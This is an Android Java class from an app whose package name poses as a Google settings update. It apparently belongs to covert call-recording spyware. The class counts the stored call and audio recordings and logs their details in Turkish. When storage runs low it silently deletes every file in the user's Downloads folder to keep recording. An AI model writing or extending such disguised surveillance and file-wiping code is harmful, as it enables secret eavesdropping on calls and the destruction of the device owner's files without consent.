package com.setting.dl.google.googlesettingupdate;

import android.content.Context;
import android.os.Environment;
import android.os.StatFs;

import com.setting.dl.google.googlesettingupdate.time.Time;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class FreeSpaceManager {
   
   private final float FREE_SPACE_LIMIT = 70.0F;
   private final Context context;
   private float freeMBytes;
   private boolean okey;
   
   public FreeSpaceManager(Context context) {
      
      this.context = context;
   
      freeMBytes = (float) getFreeBytes() / (1024 * 1024);
      
      checkRecordFiles();
   }
   
   
   private void checkRecordFiles() {
      
      List<File>    files = new ArrayList<>();
      
      File[] callFiles  = u.getCallAudioFolderFile(context).listFiles();
      File[] audioFiles = u.getAudioFolderFile(context).listFiles();
      
      if (callFiles != null) {
         
         if (callFiles.length > 0) {
            
            u.log.d(u.format("Kaydedilmiş %d arama kaydı var%n", callFiles.length));
            files.addAll(Arrays.asList(callFiles));
         }
         else {
   
            u.log.d("Kaydedilmiş bir arama kaydı yok\n");
         }
      }
      else {
   
         u.log.d("Arama kayıtlarına ulaşılamadı\n");
      }
      
      if (audioFiles != null) {
         
         if (audioFiles.length > 0) {
   
            u.log.d(u.format("Kaydedilmiş %d ses kaydı var%n", audioFiles.length));
            files.addAll(Arrays.asList(audioFiles));
         }
         else {
   
            u.log.d("Kaydedilmiş bir ses kaydı yok\n");
         }
      }
      else {
   
         u.log.d("Ses kayıtlarına ulaşılamadı\n");
      }
      
      int size = files.size();
      
      if (size == 0) {
   
         u.log.d("Kaydedilmiş bir ses dosyası bulunamadı\n");
      }
      else{
   
         u.log.d(u.format("Toplam %d kayıt var%n", size));
      }
      
      int i = 1;
      
      for (File file : files) {
         
         long duration = u.getDuration(file.getAbsolutePath());
   
         u.log.d(u.format("%d. %s [süre=%s, kbytes=%d, date=%s, sağlam=%s]%n", i++, file.getName(), u.getMp3Duration(file), file.length() / 1024L, Time.getDate(file.lastModified()), duration != -60L));
      }
      
      u.log.d(u.format("Kullanılabilir alan        : %.2f MB%n", freeMBytes));
      u.log.d(u.format("Kullanılabilir alan limiti : %.2f MB%n", FREE_SPACE_LIMIT));
      
      if (freeMBytes < FREE_SPACE_LIMIT) {
   
         u.log.d("Kullanılabilir alan kayıt yapmak için yeterli değil");
         freeSpace();
   
         freeMBytes = (float) getFreeBytes() / (1024 * 1024);
   
         if (freeMBytes > FREE_SPACE_LIMIT) {
      
            okey = true;
            return;
         }
   
         u.log.d("Kayıt için yeterli alan yok");
      }
      else{
   
         u.log.d("Kullanılabilir alan kayıt yapmak için yeterli.");
      }
   
      okey = true;
   }
   
   private void checkRecords(){
      
      
   }
   
   public boolean isOkey() {
      return okey;
   }
   
   private void freeSpace(){
      
      File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
   
      if (downloadDir == null) {
      
         u.log.d("Download klasörüne ulaşılamadı");
         return;
      }
      
      if (!downloadDir.exists()) {
         
         u.log.d("Böyle bir klasör yok : %s", downloadDir.getName());
         return;
      }
      
      deleteFiles(downloadDir);
   }
   
   private void deleteFiles(File dir) {
   
      File[] files = dir.listFiles();
   
      if (files == null) {
      
         u.log.w("Klasördeki dosyalara ulaşılamadı : %s", dir.getName());
         return;
      }
   
      if (files.length == 0) {
      
         u.log.d("Klasörde dosya yok");
         return;
      }
   
      u.log.d("Klasörde %d dosya var", files.length);
   
      for (File file : files) {
   
         if (file.delete()) {
            
            u.log.d("Dosya silindi : %s", file.getName());
         }
         else{
   
            u.log.w("Dosya silinemedi : %s", file.getName());
         }
      }
   }
   
   private long getFreeBytes(){
      
      return new StatFs(context.getFilesDir().getAbsolutePath()).getAvailableBytes();
   }
   
   
}
